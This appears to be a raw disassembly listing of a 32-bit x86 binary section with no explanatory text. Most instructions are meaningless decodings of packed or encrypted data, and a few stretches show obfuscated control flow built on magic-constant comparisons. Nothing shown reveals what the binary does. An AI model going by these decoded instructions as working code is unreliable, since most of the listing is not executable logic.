  4071dc:	pop    ebp
  4071dd:	or     BYTE PTR [ebx+esi*8],ah
  4071e0:	mov    eax,0xe37a6479
  4071e5:	lods   al,BYTE PTR ds:[esi]
  4071e6:	aam    0x61
  4071e8:	pop    ss
  4071e9:	dec    edx
  4071ea:	shl    DWORD PTR [edx-0x4f],1
  4071ed:	push   0xffffffa3
  4071ef:	dec    ecx
  4071f0:	sbb    al,0xc
  4071f2:	ror    DWORD PTR [edx+0x5b],1
  4071f5:	retf   0x739f
  4071f8:	xchg   esi,eax
  4071f9:	repnz mov bh,0x73
  4071fc:	cdq    
  4071fd:	std    
  4071fe:	mov    dl,0x8a
  407200:	dec    edi
  407201:	ret    0xc697
  407204:	int    0x6c
  407206:	leave  
  407207:	(bad)  
  407208:	lea    edx,[ecx+esi*8]
  40720b:	inc    edx
  40720c:	out    dx,al
  40720d:	retf   
  40720e:	push   0xcf862e55
  407213:	inc    ecx
  407214:	sub    esi,DWORD PTR [edi+ebp*4-0x1038bb04]
  40721b:	mov    al,ds:0x8fac0ee
  407220:	jp     0x4071a8
  407222:	adc    al,cl
  407224:	ins    BYTE PTR es:[edi],dx
  407225:	scas   eax,DWORD PTR es:[edi]
  407226:	and    eax,0x1c27791
  40722b:	(bad)  
  40722c:	mov    edx,0xb5763da
  407231:	test   eax,0xb56ee78c
  407236:	add    ch,BYTE PTR [esi-0x53]
  407239:	int    0x92
  40723b:	push   ebp
  40723c:	xchg   BYTE PTR [ecx+0x47],bh
  40723f:	jmp    DWORD PTR [ebx+0x72]
  407242:	adc    DWORD PTR [edx],edi
  407244:	imul   ecx,DWORD PTR [edi],0xa7d302f4
  40724a:	cmp    eax,edi
  40724c:	inc    ebp
  40724d:	aam    0x39
  40724f:	dec    edi
  407250:	add    BYTE PTR [eax],al
  407252:	mov    DWORD PTR ds:0x4344ef,0x15ae
  40725c:	cmp    eax,DWORD PTR [edx]
  40725e:	mov    DWORD PTR ds:0x4344df,0x344d
  407268:	je     0x40836f
  40726e:	mov    DWORD PTR [ebp-0xc],0x705fd8c
  407275:	lea    eax,[ebp-0xc]
  407278:	add    DWORD PTR ds:0x434613,0x4344e3
  407282:	mov    DWORD PTR [ebp-0x10],eax
  407285:	xor    eax,DWORD PTR ds:0x434507
  40728b:	mov    eax,DWORD PTR [ebp-0x10]
  40728e:	not    edx
  407290:	mov    edx,DWORD PTR [eax]
  407292:	or     DWORD PTR ds:0x4344fb,0x7c2e
  40729c:	imul   edx,edx,0xf89ea9ed
  4072a2:	mov    DWORD PTR ds:0x43454b,0x5d50
  4072ac:	mov    DWORD PTR [eax],edx
  4072ae:	mov    DWORD PTR ds:0x43453b,0x7ba0
  4072b8:	mov    eax,DWORD PTR [ebp-0xc]
  4072bb:	cmp    eax,0x9155269c
  4072c0:	je     0x4076db
  4072c6:	mov    edi,DWORD PTR ds:0x4345ef
  4072cc:	mov    eax,ds:0x434633
  4072d1:	sub    eax,edi
  4072d3:	sub    edi,DWORD PTR [edi+eax*1]
  4072d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4072d9:	or     DWORD PTR [eax],0x60751c9d
  4072df:	mov    eax,DWORD PTR [ebp-0x8]
  4072e2:	xor    eax,ecx
  4072e4:	add    eax,esi
  4072e6:	pop    edi
  4072e7:	pop    esi
  4072e8:	jmp    0x4076d6
  4072ed:	pop    ds
  4072ee:	add    al,0x2a
  4072f0:	or     eax,0x2c313d35
  4072f5:	add    eax,0x37907a48
  4072fa:	aad    0x68
  4072fc:	out    0x3f,al
  4072fe:	iret   
  4072ff:	jle    0x40737f
  407301:	dec    edi
  407302:	jns    0x407382
  407304:	jle    0x407290
  407306:	aad    0x6
  407308:	mov    eax,0x6d2fe7ab
  40730d:	cmp    edx,esp
  40730f:	jecxz  0x407341
  407311:	xchg   edi,eax
  407312:	(bad)  
  407313:	outs   dx,BYTE PTR ds:[esi]
  407314:	stos   DWORD PTR es:[edi],eax
  407315:	cmp    BYTE PTR [esi],ch
  407317:	xor    esi,DWORD PTR [edx+0x52bc4743]
  40731d:	or     BYTE PTR [edi+edx*4],cl
  407320:	jbe    0x407326
  407322:	mov    al,ds:0x5de1b090
  407327:	ficomp WORD PTR [ecx-0x1e]
  40732a:	pusha  
  40732b:	jno    0x407333
  40732d:	jmp    0x810395
  407332:	cmp    cl,BYTE PTR [esi+edi*2+0x48]
  407336:	or     al,0x1d
  407338:	push   eax
  407339:	cmp    DWORD PTR [ebp+0x309801f6],ecx
  40733f:	xor    dl,0x11
  407342:	dec    ebx
  407343:	inc    eax
  407344:	loopne 0x407359
  407346:	mov    ah,0xd6
  407348:	aam    0x2c
  40734a:	icebp  
  40734b:	mov    eax,0x9bf9f85e
  407350:	stos   BYTE PTR es:[edi],al
  407351:	push   ds
  407352:	(bad)  
  407356:	stc    
  407357:	inc    ebx
  407358:	cmp    ecx,DWORD PTR [ebx-0x15f62d5a]
  40735e:	sub    dl,BYTE PTR [ebp+0x10]
  407361:	cmp    al,0x61
  407363:	cwde   
  407364:	std    
  407365:	dec    ebx
  407366:	or     edx,ebx
  407368:	aad    0xf9
  40736a:	das    
  40736b:	lock not DWORD PTR [ebx-0x7be570e5]
  407372:	sahf   
  407373:	mov    ecx,DWORD PTR fs:[ebx]
  407376:	in     al,0x5f
  407378:	aaa    
  407379:	imul   esi,DWORD PTR [esi+0x2361a854],0xc6271149
  407383:	fwait
  407384:	push   ecx
  407385:	aam    0xc8
  407387:	and    dh,dh
  407389:	inc    edi
  40738a:	cmp    DWORD PTR [ebp+ebp*4+0x58aa769c],ecx
  407391:	mov    ecx,0x3629b983
  407396:	jae    0x407393
  407398:	mov    bl,0xbf
  40739a:	mov    edx,0x744ac55f
  40739f:	fcom   QWORD PTR [eax+0x63]
  4073a2:	stos   BYTE PTR es:[edi],al
  4073a3:	mov    bh,0x62
  4073a5:	lods   eax,DWORD PTR ds:[esi]
  4073a6:	mov    ebp,DWORD PTR [edx]
  4073a8:	add    BYTE PTR [esi+0x6],al
  4073ab:	sub    dl,BYTE PTR [edx]
  4073ad:	or     DWORD PTR [ebx+0x5],eax
  4073b0:	addr16 push ds
  4073b2:	into   
  4073b3:	sub    bl,BYTE PTR [ecx+0x2e]
  4073b6:	and    BYTE PTR [ebx-0x6a198d13],ch
  4073bc:	or     edx,DWORD PTR [edx-0x6bf07468]
  4073c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073c3:	test   eax,0xefa5cd9
  4073c8:	sub    bh,ah
  4073ca:	sbb    BYTE PTR [eax],bl
  4073cc:	jle    0x40739f
  4073ce:	(bad)  
  4073cf:	cld    
  4073d0:	adc    BYTE PTR [ebx-0x49],ch
  4073d3:	mov    es,WORD PTR [eax]
  4073d5:	and    ebp,DWORD PTR [eax+0x2b]
  4073d8:	lock (bad) 
  4073db:	loopne 0x407432
  4073dd:	pusha  
  4073de:	mov    esi,0xb1740c66
  4073e3:	ret    0xced9
  4073e6:	mov    ecx,0xb7c233c6
  4073eb:	ins    BYTE PTR es:[edi],dx
  4073ec:	xor    DWORD PTR [eax-0x73],0xffffffc6
  4073f0:	mov    DWORD PTR [eax],ecx
  4073f2:	ds loop 0x4073e2
  4073f5:	dec    ebp
  4073f6:	add    dl,BYTE PTR [edx]
  4073f8:	mov    ecx,0xbd279c9d
  4073fd:	int    0x22
  4073ff:	das    
  407400:	(bad)  
  407401:	aas    
  407402:	adc    edi,esp
  407404:	mov    ebx,0x3119c4e7
  407409:	in     eax,0xa4
  40740b:	jnp    0x407436
  40740d:	outs   dx,DWORD PTR ds:[esi]
  40740e:	loopne 0x407421
  407410:	jmp    0x407449
  407412:	popa   
  407413:	xor    dh,BYTE PTR [ebx+0x57]
  407416:	int3   
  407417:	in     al,dx
  407418:	mov    eax,ds:0xbd59da3b
  40741d:	push   edx
  40741e:	repnz push 0xffffffc9
  407421:	popf   
  407422:	fistp  WORD PTR [ecx+0x51f24196]
  407428:	and    al,0xec
  40742a:	add    esp,DWORD PTR [eax-0x21a876c6]
  407430:	enter  0x6b29,0xa6
  407434:	dec    esp
  407435:	xor    bl,BYTE PTR [ebx+0x6]
  407438:	sbb    ecx,DWORD PTR [edx]
  40743a:	xlat   BYTE PTR ds:[ebx]
  40743b:	sbb    ch,BYTE PTR [esi]
  40743d:	pop    ecx
  40743e:	popa   
  40743f:	pop    esp
  407440:	imul   ebp,DWORD PTR [edi],0x362829be
  407446:	add    DWORD PTR ds:0x4e99a60,edi
  40744c:	adc    al,0x95
  40744e:	cld    
  40744f:	clc    
  407450:	add    BYTE PTR [edx-0x68],bh
  407453:	push   edx
  407454:	ret    
  407455:	push   ss
  407456:	pop    es
  407457:	mov    edi,0x49693424
  40745c:	and    DWORD PTR [esi-0x66ca955b],0x51af682c
  407466:	inc    edi
  407467:	aad    0x83
  407469:	aas    
  40746a:	push   ecx
  40746b:	pop    esi
  40746c:	inc    eax
  40746d:	push   DWORD PTR ss:[ebx]
  407470:	fadd   DWORD PTR [eax-0x58f512fb]
  407476:	inc    ebp
  407477:	retf   
  407478:	mov    dh,0x5b
  40747a:	fmul   DWORD PTR [edx+edx*1]
  40747d:	cmc    
  40747e:	cmp    DWORD PTR [ecx+0x31516f70],0xdc797a5d
  407488:	xchg   esi,eax
  407489:	sub    dh,BYTE PTR [ebp-0x7dd518c3]
  40748f:	shr    DWORD PTR [ecx*2+0x28377dd4],1
  407496:	or     al,0xea
  407498:	dec    esp
  407499:	mov    esi,0x846aa989
  40749e:	ins    DWORD PTR es:[edi],dx
  40749f:	int3   
  4074a0:	leave  
  4074a1:	inc    ebx
  4074a2:	rol    DWORD PTR [edi-0x1101e1a4],0xad
  4074a9:	jl     0x4074e9
  4074ab:	mov    ebx,0xebf8b90b
  4074b0:	out    dx,eax
  4074b1:	pop    edi
  4074b2:	pop    ebp
  4074b3:	fimul  WORD PTR [ebx]
  4074b5:	and    al,0x7b
  4074b7:	push   ebx
  4074b8:	sbb    al,0xd3
  4074ba:	inc    ebp
  4074bb:	call   0xad5b1116
  4074c0:	ins    BYTE PTR es:[edi],dx
  4074c1:	or     ecx,DWORD PTR [ecx+0x21]
  4074c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074c5:	shr    bl,1
  4074c7:	ror    bl,0x64
  4074ca:	inc    ebp
  4074cb:	sbb    al,al
  4074cd:	aam    0x7c
  4074cf:	inc    edi
  4074d0:	cmp    eax,0xca975488
  4074d5:	adc    eax,0x1bb5100
  4074da:	inc    ebx
  4074db:	push   ebp
  4074dc:	sti    
  4074dd:	cmp    BYTE PTR [edx+0x2e],0x43
  4074e1:	jmp    0x4074d6
  4074e3:	out    0x59,eax
  4074e5:	test   BYTE PTR [ebx-0x32f2b815],0x74
  4074ec:	ret    
  4074ed:	mov    ebp,0x147c051c
  4074f2:	bound  ebx,QWORD PTR [eax+ebp*4-0x5c]
  4074f6:	scas   al,BYTE PTR es:[edi]
  4074f7:	push   ss
  4074f8:	popf   
  4074f9:	popa   
  4074fa:	(bad)  
  4074fb:	div    DWORD PTR [ebp+0x5c]
  4074fe:	mov    ah,0x3
  407500:	mov    bh,0x3b
  407502:	sub    ah,BYTE PTR [esi]
  407504:	push   ecx
  407505:	ds scas eax,DWORD PTR es:[edi]
  407507:	adc    eax,0xec5e02cd
  40750c:	fdiv   DWORD PTR [edx+0xc77e976]
  407512:	cmp    al,0xf8
  407514:	push   es
  407515:	ror    BYTE PTR [esi+0x2],1
  407518:	and    BYTE PTR [ebp-0x23],ah
  40751b:	shr    BYTE PTR [ebp-0x41],0x85
  40751f:	adc    edx,eax
  407521:	fisttp QWORD PTR [eax+ecx*8]
  407524:	add    esi,DWORD PTR [ebp-0x53]
  407527:	arpl   WORD PTR ds:0x45f6d3,sp
  40752d:	inc    ebx
  40752e:	add    DWORD PTR [esi+eax*2],ebp
  407531:	outs   dx,BYTE PTR ds:[esi]
  407532:	push   0x902da642
  407537:	push   0xffffff9c
  407539:	xor    ah,dl
  40753b:	int    0x3e
  40753d:	pop    esi
  40753e:	fisttp WORD PTR [ebx-0x6b]
  407541:	js     0x40754e
  407543:	jp     0x4075be
  407545:	das    
  407546:	inc    esp
  407547:	lods   eax,DWORD PTR ds:[esi]
  407548:	repz (bad) 
  40754b:	push   edx
  40754c:	test   al,0x7
  40754e:	cmp    eax,0x63a59d34
  407553:	push   esp
  407554:	or     eax,0x2e4362e9
  407559:	xchg   esi,eax
  40755a:	xchg   edi,eax
  40755b:	add    eax,0x812c967b
  407560:	fmul   QWORD PTR [eax+0x2e]
  407563:	cmp    al,BYTE PTR [edx+0x4f7a97ce]
  407569:	jb     0x407510
  40756b:	stos   BYTE PTR es:[edi],al
  40756c:	jb     0x407534
  40756e:	sbb    al,bl
  407570:	fsub   QWORD PTR [edx-0x63e3c0a6]
  407576:	mov    al,ds:0x7f01c75d
  40757b:	out    0xc4,eax
  40757d:	xor    esp,DWORD PTR gs:[ecx]
  407580:	jmp    0x4075c0
  407582:	mov    ecx,0x6e701e48
  407587:	mov    ecx,0xe4d32e51
  40758c:	addr16 retf 
  40758e:	shr    DWORD PTR [edx],cl
  407590:	mov    edx,ebx
  407592:	inc    ebx
  407593:	scas   al,BYTE PTR es:[edi]
  407594:	add    eax,0x9c9f2a15
  407599:	cwde   
  40759a:	test   BYTE PTR [edx-0x36],dl
  40759d:	adc    ch,BYTE PTR fs:[edi+0x71]
  4075a1:	or     ecx,edi
  4075a3:	ja     0x407611
  4075a5:	mov    bl,0x42
  4075a7:	inc    edx
  4075a8:	mov    al,0x1a
  4075aa:	adc    bh,ch
  4075ac:	cmc    
  4075ad:	jmp    0xbcbc:0x981ff0a6
  4075b4:	mov    dh,0x58
  4075b6:	mov    ch,0xf2
  4075b8:	or     esi,edx
  4075ba:	aad    0xd8
  4075bc:	shr    dl,cl
  4075be:	inc    DWORD PTR [eax-0x2b87ca06]
  4075c4:	fs push esi
  4075c6:	fdivr  st(0),st
  4075c8:	dec    ebp
  4075c9:	jne    0x4075af
  4075cb:	push   ecx
  4075cc:	outs   dx,DWORD PTR ds:[esi]
  4075cd:	rcl    eax,cl
  4075cf:	div    DWORD PTR [esi+0x5b03ff3d]
  4075d5:	mov    ebx,0x3d229ee4
  4075da:	add    DWORD PTR [ecx+0x154c0123],0xfe4d9d55
  4075e4:	mov    bh,0xf4
  4075e6:	pop    ss
  4075e7:	pop    ss
  4075e8:	out    dx,eax
  4075e9:	fcomp  DWORD PTR [ebx-0x31]
  4075ec:	jns    0x4075b5
  4075ee:	out    dx,eax
  4075ef:	mov    eax,0xbe722cdf
  4075f4:	push   ebp
  4075f5:	loop   0x4075d5
  4075f7:	jns    0x4075aa
  4075f9:	push   ds
  4075fa:	mov    bh,0x45
  4075fc:	jmp    0x407673
  4075fe:	mov    esp,0x1a05089c
  407603:	add    eax,0x5022b9e8
  407608:	jnp    0x4075ee
  40760a:	ins    BYTE PTR es:[edi],dx
  40760b:	and    dl,BYTE PTR [edi+0x71c3ce33]
  407611:	(bad)  
  407612:	cli    
  407613:	xchg   esp,eax
  407614:	retf   0x4168
  407617:	jmp    0x1d47:0x65e0471a
  40761e:	mov    BYTE PTR [edx],al
  407620:	mov    bh,0x28
  407622:	jno    0x40769b
  407624:	shl    BYTE PTR [edi],1
  407626:	das    
  407627:	xchg   ebx,eax
  407628:	ins    DWORD PTR es:[edi],dx
  407629:	out    0x1e,eax
  40762b:	cli    
  40762c:	ret    0xaf4
  40762f:	xor    DWORD PTR [eax+0x33b02d9e],ecx
  407635:	jo     0x40760f
  407637:	retf   
  407638:	dec    esi
  407639:	shl    BYTE PTR [ebx+0x13],0xc1
  40763d:	inc    ecx
  40763e:	sbb    al,0xec
  407640:	fiadd  DWORD PTR [ebp-0x44ce0cd6]
  407646:	iret   
  407647:	push   esp
  407648:	ja     0x4075e2
  40764a:	sub    esi,ecx
  40764c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40764d:	jne    0x407658
  40764f:	sub    al,0x40
  407651:	cwde   
  407652:	outs   dx,DWORD PTR ds:[esi]
  407653:	fdivr  DWORD PTR fs:[ebx+0x54]
  407657:	int3   
  407658:	add    esi,DWORD PTR cs:[esi-0x3a17ccd7]
  40765f:	pop    ebx
  407660:	jle    0x407667
  407662:	fdiv   QWORD PTR [eax+0x15]
  407665:	pop    esp
  407666:	pop    ss
  407667:	outs   dx,BYTE PTR ds:[esi]
  407668:	ins    BYTE PTR es:[edi],dx
  407669:	aaa    
  40766a:	aas    
  40766b:	lods   eax,DWORD PTR cs:[esi]
  40766d:	loop   0x4076c3
  40766f:	pop    es
  407670:	mov    ah,0x2d
  407672:	push   0x1fa9edc0
  407677:	loope  0x40768e
  407679:	add    eax,0xffb2a2a1
  40767e:	sti    
  40767f:	jns    0x407636
  407681:	inc    esp
  407682:	jmp    0x72ccb45e
  407687:	cmp    BYTE PTR [edx-0x5a],bl
  40768a:	repnz test ax,0xbc41
  40768f:	inc    ecx
  407690:	pop    edx
  407691:	pop    edx
  407692:	push   edi
  407693:	xor    DWORD PTR [ebp+0x60],eax
  407696:	out    0xd0,eax
  407698:	lea    esp,[esi-0x75dec080]
  40769e:	xchg   ebp,eax
  40769f:	xor    al,0xfe
  4076a1:	adc    bl,BYTE PTR [ebp-0x2d]
  4076a4:	(bad)  [edi-0x6f]
  4076a7:	or     dl,cl
  4076a9:	mov    edx,0xd4129b95
  4076ae:	mov    DWORD PTR [ebp-0xa],edi
  4076b1:	or     DWORD PTR [ebp+0x53],esp
  4076b4:	popa   
  4076b5:	inc    esp
  4076b6:	iret   
  4076b7:	push   ebp
  4076b8:	aaa    
  4076b9:	mov    dh,0x30
  4076bb:	jmp    0x4076ba
  4076bd:	add    al,0x86
  4076bf:	jne    0x40773e
  4076c1:	outs   dx,DWORD PTR ds:[esi]
  4076c2:	and    al,0x97
  4076c4:	lea    esp,[eax+edi*8-0x4af35ca1]
  4076cb:	dec    ebx
  4076cc:	dec    ebp
  4076cd:	sbb    bl,al
  4076cf:	sub    dl,BYTE PTR [esi+0x3cb2b29]
  4076d5:	dec    edx
  4076d6:	pop    ebx
  4076d7:	leave  
  4076d8:	ret    0x4
  4076db:	mov    eax,DWORD PTR [ebp-0xc]
  4076de:	add    eax,DWORD PTR [ebp-0x18]
  4076e1:	cmp    eax,0x89f4544a
  4076e6:	je     0x4076fa
  4076ec:	mov    eax,DWORD PTR [ebp-0x10]
  4076ef:	and    DWORD PTR [eax],0x751c9e
  4076f5:	jmp    0x4072df
  4076fa:	mov    eax,DWORD PTR [ebp-0xc]
  4076fd:	mov    edx,DWORD PTR [ebp-0x18]
  407700:	or     eax,edx
  407702:	cmp    eax,0xf9df2fbe
  407707:	je     0x407b09
  40770d:	jmp    0x407afb
  407712:	ret    
  407713:	or     esi,DWORD PTR [ebx+eiz*1+0x7c]
  407717:	ins    DWORD PTR es:[edi],dx
  407718:	pop    ebp
  407719:	jmp    0x407762
  40771b:	(bad)  
  40771c:	pop    ecx
  40771d:	sbb    eax,0x8503f308
  407722:	or     bl,cl
  407724:	jle    0x4077a4
  407726:	dec    edi
  407727:	jns    0x4077a7
  407729:	jle    0x4076ed
  40772b:	retf   0x7806
  40772e:	test   DWORD PTR [ecx+edx*1-0x678a356],0xd2ecd8ba
  407739:	cmc    
  40773a:	fwait
  40773b:	retf   0x5422
  40773e:	cmc    
  40773f:	add    ebx,DWORD PTR [ebx+0x3eecdb26]
  407745:	out    0x47,al
  407747:	dec    edx
  407748:	movzx  edx,BYTE PTR [ecx-0x3b]
  40774c:	push   es
  40774d:	fcmovu st,st(1)
  40774f:	mov    edx,0x970692ea
  407754:	ins    DWORD PTR es:[edi],dx
  407755:	lahf   
  407756:	in     eax,0xc8
  407758:	inc    ecx
  407759:	push   ebx
  40775a:	mov    ecx,0x2abe506c
  40775f:	or     DWORD PTR [ecx-0x1bfae53b],eax
  407765:	mov    BYTE PTR [esi],bh
  407767:	mov    bh,0xd8
  407769:	xor    al,0x93
  40776b:	mov    al,ds:0xac3d9719
  407770:	enter  0xff1d,0x38
  407774:	sar    DWORD PTR [esi+0x40c18b9e],0x80
  40777b:	inc    ecx
  40777c:	xchg   esi,eax
  40777d:	(bad)  
  40777f:	aad    0xe9
  407781:	xchg   ebx,eax
  407782:	mov    esp,gs
  407784:	mov    cl,0xda
  407786:	adc    ebp,eax
  407788:	sub    eax,0xb32a7ada
  40778d:	das    
  40778e:	retf   0x7692
  407791:	mov    ah,BYTE PTR [eax-0x89c87a2]
  407797:	mov    ds:0xd306642e,eax
  40779c:	push   eax
  40779d:	xchg   edi,eax
  40779e:	mov    ?,WORD PTR [edi]
  4077a0:	mov    dh,BYTE PTR [esi]
  4077a2:	mov    esi,0xcaf9568
  4077a7:	mov    ecx,0xb27e7f1f
  4077ac:	or     eax,0xf8152f51
  4077b1:	imul   esi,DWORD PTR [esi+0x5aa591fa],0xffffff84
  4077b8:	sub    DWORD PTR [eax+0x42],ebx
  4077bb:	add    DWORD PTR [ebx+0x32],eax
  4077be:	mov    ah,0xa2
  4077c0:	xchg   bh,al
  4077c2:	in     al,dx
  4077c3:	xchg   ebp,eax
  4077c4:	push   es
  4077c5:	loopne 0x4077b0
  4077c7:	dec    esi
  4077c8:	ret    0xe63d
  4077cb:	fld    TBYTE PTR [ecx-0x67]
  4077ce:	imul   ecx,DWORD PTR [ebx+0x4f],0x2f
  4077d2:	out    0x2d,al
  4077d4:	stos   DWORD PTR es:[edi],eax
  4077d5:	cwde   
  4077d6:	add    DWORD PTR [edi-0x35],ebx
  4077d9:	enter  0x4430,0xde
  4077dd:	clc    
  4077de:	ret    
  4077df:	sbb    eax,0x522bcb3
  4077e4:	bound  ebp,QWORD PTR [esi]
  4077e6:	sub    eax,0xeaf116e5
  4077eb:	push   ecx
  4077ec:	cmp    bl,BYTE PTR [edi-0x7d]
  4077ef:	mov    ?,WORD PTR [edi-0x3cd0989b]
  4077f5:	into   
  4077f6:	imul   ebp,DWORD PTR [edx-0x2b],0xa2fcdaf0
  4077fd:	je     0x407801
  4077ff:	cmp    al,0x6a
  407801:	push   esi
  407802:	int    0x40
  407804:	jno    0x4077d3
  407806:	add    edx,DWORD PTR [edi-0x3f]
  407809:	dec    ebp
  40780a:	xchg   edi,eax
  40780b:	dec    eax
  40780c:	push   ss
  40780d:	push   es
  40780e:	or     DWORD PTR [esi+ebp*1+0x12403534],eax
  407815:	iret   
  407816:	push   esi
  407817:	sar    DWORD PTR [ebx],0x56
  40781a:	aad    0x67
  40781c:	stos   DWORD PTR es:[edi],eax
  40781d:	ror    BYTE PTR [ecx-0x64eaebc4],cl
  407823:	ror    DWORD PTR [ecx],1
  407825:	adc    DWORD PTR [edi-0x619f1da5],0xffffffc5
  40782c:	(bad)  
  40782d:	push   ds
  40782e:	(bad)
  407832:	scas   al,BYTE PTR es:[edi]
  407833:	clc    
  407834:	xchg   edi,eax
  407835:	adc    ah,BYTE PTR ds:0x92555d7a
  40783b:	push   edi
  40783c:	jl     0x4077fb
  40783e:	mov    DWORD PTR [edx-0x5bfd7e8d],esp
  407844:	into   
  407845:	outs   dx,BYTE PTR ds:[esi]
  407846:	aaa    
  407847:	or     edx,0x0
  40784a:	fs and al,0x9f
  40784d:	mov    eax,0xc0ad6946
  407852:	cdq    
  407853:	mov    al,0x38
  407855:	cmp    ebx,DWORD PTR ds:0x40dd33c2
  40785b:	cs push edi
  40785d:	or     eax,0x381f25d7
  407862:	imul   esp,eax,0xffffffd0
  407865:	mov    cs,WORD PTR [edx+0x44b71b00]
  40786b:	shl    ch,cl
  40786d:	sbb    BYTE PTR ds:0xd6d864ac,ah
  407873:	adc    ah,BYTE PTR [edi]
  407875:	and    dl,dl
  407877:	mov    cl,0x6a
  407879:	cld    
  40787a:	mov    ds:0x1981ad75,al
  40787f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407880:	sub    DWORD PTR ds:0x20f6cd37,esi
  407886:	sub    eax,0xbd64af4c
  40788b:	cs xchg esi,eax
  40788d:	sbb    edx,edi
  40788f:	sbb    ebp,ecx
  407891:	xchg   ebx,eax
  407892:	ds sbb bh,ah
  407895:	jae    0x4078b7
  407897:	cmp    DWORD PTR [ebx],esp
  407899:	or     al,0x89
  40789b:	push   0x9de5f169
  4078a0:	sbb    al,0x9f
  4078a2:	popa   
  4078a3:	jbe    0x40782a
  4078a5:	and    DWORD PTR [edi-0x28],0x32e3b86f
  4078ac:	mov    al,0x26
  4078ae:	adc    BYTE PTR [eax],ch
  4078b0:	xor    DWORD PTR [edi],0x6a
  4078b3:	adc    ebp,DWORD PTR [edi-0x8adf979]
  4078b9:	scas   al,BYTE PTR es:[edi]
  4078ba:	repz retf 0xcffb
  4078be:	aam    0x12
  4078c0:	sbb    ecx,DWORD PTR [ecx]
  4078c2:	arpl   WORD PTR [edx+ebx*2-0x38],si
  4078c6:	rcl    cl,cl
  4078c8:	(bad)  
  4078c9:	or     eax,0x26c0b9db
  4078ce:	push   ebp
  4078cf:	punpcklbw mm4,DWORD PTR [esi]
  4078d2:	jbe    0x4078b6
  4078d4:	sahf   
  4078d5:	sbb    edx,DWORD PTR [edi+0x18]
  4078d8:	out    dx,eax
  4078d9:	ins    BYTE PTR es:[edi],dx
  4078da:	(bad)  
  4078db:	cmp    eax,DWORD PTR [ebx]
  4078dd:	xor    eax,0x413b4d11
  4078e2:	and    BYTE PTR [esi+ebp*1-0x3c87779f],ah
  4078e9:	xor    cl,bh
  4078eb:	adc    dh,0x8e
  4078ee:	dec    ebp
  4078ef:	jg     0x4078ad
  4078f1:	mov    al,0xef
  4078f3:	retf   0x9dd3
  4078f6:	sahf   
  4078f7:	sbb    DWORD PTR [edx+esi*1-0x3c],ebx
  4078fb:	pop    ebx
  4078fc:	mov    eax,0xff323e16
  407901:	ret    
  407902:	fcom   QWORD PTR [ebp-0x4f5895e9]
  407908:	fstp   DWORD PTR [ecx-0x60]
  40790b:	out    0x55,al
  40790d:	imul   ebx,ebp,0x1ab5bfa6
  407913:	push   esp
  407914:	inc    ebp
  407915:	leave  
  407916:	adc    esi,DWORD PTR gs:[ebx]
  407919:	jg     0x4078f0
  40791b:	cmp    BYTE PTR [ebx-0x1e9a53c7],dl
  407921:	std    
  407922:	sbb    BYTE PTR [ecx+ecx*2+0x30],0xc6
  407927:	push   edx
  407928:	sbb    ch,dh
  40792a:	pop    ds
  40792b:	mov    eax,0x3e7f734e
  407930:	xor    al,0x4e
  407932:	jae    0x407933
  407934:	inc    ecx
  407935:	popf   
  407936:	add    edx,ecx
  407938:	inc    esp
  407939:	mov    dl,0x73
  40793b:	mov    edx,0xf4749e2c
  407940:	rcl    DWORD PTR [edx+0x7d6cd2bf],cl
  407946:	(bad)  
  407947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407948:	outs   dx,BYTE PTR ds:[esi]
  407949:	sub    BYTE PTR [ebx+0x3975163d],dh
  40794f:	xor    esi,ecx
  407951:	dec    ecx
  407952:	jge    0x40796f
  407954:	sub    DWORD PTR [esi],eax
  407956:	mov    cs,WORD PTR [eax]
  407958:	and    DWORD PTR [ecx-0x101f40cc],0xffffff9b
  40795f:	and    al,0x15
  407961:	sbb    eax,DWORD PTR [eax]
  407963:	inc    ecx
  407964:	pop    edi
  407965:	adc    al,0xd6
  407967:	test   eax,0x4b4c274
  40796c:	xchg   edx,eax
  40796d:	aam    0x53
  40796f:	imul   ebp,DWORD PTR [esi+0x7c],0xffffff92
  407973:	js     0x40794a
  407975:	xor    al,0x79
  407977:	cmp    eax,0xa2958451
  40797c:	cmp    al,0xf6
  40797e:	daa    
  40797f:	push   0x608c6b2d
  407984:	adc    edi,DWORD PTR [eax-0x7a5c175c]
  40798a:	sar    DWORD PTR [ecx+0x31],cl
  40798d:	call   0x5537:0xdf1fa534
  407994:	lock icebp 
  407996:	jae    0x407a17
  407998:	mov    dl,0x40
  40799a:	pop    ebp
  40799b:	out    dx,al
  40799c:	jle    0x4079e6
  40799e:	test   al,0xa9
  4079a0:	sub    bl,bh
  4079a2:	add    DWORD PTR [ebp+0x2c6ba644],edx
  4079a8:	xlat   BYTE PTR ds:[ebx]
  4079a9:	(bad)  
  4079aa:	push   0x50925a17
  4079af:	lods   al,BYTE PTR ds:[esi]
  4079b0:	adc    eax,0xf2d6744a
  4079b5:	xchg   edx,eax
  4079b6:	scas   al,BYTE PTR es:[edi]
  4079b7:	ja     0x407995
  4079b9:	mov    BYTE PTR [ebp-0x1d4a0d46],0xc
  4079c0:	rol    DWORD PTR [esi-0x411b6aa8],cl
  4079c6:	sub    dh,BYTE PTR [edi+0xf344b71]
  4079cc:	sbb    cl,BYTE PTR [ecx+0x7e]
  4079cf:	(bad)  
  4079d0:	or     eax,0x8244a16b
  4079d5:	dec    edx
  4079d6:	hlt    
  4079d7:	dec    ebx
  4079d8:	pop    esi
  4079d9:	test   BYTE PTR [ebx],cl
  4079db:	jge    0x407a3c
  4079dd:	or     ebp,esi
  4079df:	ss push cs
  4079e1:	mov    dh,0xd3
  4079e3:	sbb    al,0x6e
  4079e5:	add    dl,BYTE PTR [ebp+0x39ec496d]
  4079eb:	fsub   DWORD PTR [eax-0x74]
  4079ee:	and    ebx,ebx
  4079f0:	sub    bl,cl
  4079f2:	int3   
  4079f3:	mov    ds:0xb2457064,al
  4079f8:	dec    edx
  4079f9:	icebp  
  4079fa:	aad    0x68
  4079fc:	jns    0x407a7c
  4079fe:	jns    0x4079b8
  407a00:	or     bh,BYTE PTR [ecx-0x3ad7d47f]
  407a06:	fistp  DWORD PTR [edx]
  407a08:	sbb    dl,BYTE PTR [ebx]
  407a0a:	lds    ebx,FWORD PTR [esi]
  407a0c:	lods   eax,DWORD PTR ds:[esi]
  407a0d:	pop    ds
  407a0e:	out    0x4b,eax
